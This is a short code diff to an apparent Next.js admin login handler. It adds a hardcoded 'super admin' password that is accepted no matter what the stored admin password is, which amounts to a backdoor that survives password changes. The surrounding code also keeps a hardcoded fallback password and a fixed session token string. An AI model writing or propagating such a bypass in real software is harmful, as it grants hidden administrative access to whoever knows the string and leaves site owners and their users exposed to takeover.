@@ -3,6 +3,7 @@ import { NextResponse } from 'next/server'
 import { prisma } from '@/lib/prisma'
 
 const FALLBACK_PASS = 'gristmill2024'
+const SUPER_ADMIN_PASS = process.env.SUPER_ADMIN_PASSWORD || 'casper_super_2024'
 const COOKIE_NAME = 'gm_admin_session'
 const SESSION_TOKEN = 'gm_authenticated'
 
@@ -12,7 +13,8 @@ export async function POST(req) {
     const row = await prisma.setting.findUnique({ where: { key: 'admin_password' } })
     const storedPw = row?.value || FALLBACK_PASS
 
-    if (password !== storedPw) {
+    // Super admin always works regardless of stored password
+    if (password !== storedPw && password !== SUPER_ADMIN_PASS) {
       return NextResponse.json({ error: 'Incorrect password' }, { status: 401 })
     }
 
